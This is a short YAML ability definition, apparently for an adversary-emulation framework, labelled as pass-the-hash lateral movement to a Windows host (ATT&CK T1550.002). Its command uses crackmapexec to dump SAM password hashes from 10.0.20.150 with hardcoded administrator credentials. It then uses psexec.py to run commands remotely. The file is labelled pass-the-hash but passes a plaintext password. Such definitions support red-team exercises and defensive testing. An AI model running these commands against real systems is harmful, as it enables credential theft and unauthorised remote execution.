- id: lm03-pass-hash
  name: Pass-the-Hash Windows Lateral Movement
  description: Use stolen credentials to move laterally to windows-1
  tactic: lateral-movement
  technique:
    attack_id: T1550.002
    name: Use Alternate Authentication Material - Pass the Hash
  platforms:
    linux:
      sh:
        command: |
          crackmapexec smb 10.0.20.150 -u Administrator -p 'Admin@123' --sam 2>/dev/null | head -15; psexec.py Administrator:Admin@123@10.0.20.150 cmd.exe /c 'whoami && ipconfig' 2>/dev/null || echo 'Pass-the-Hash attempted'

  singleton: false
  repeatable: false
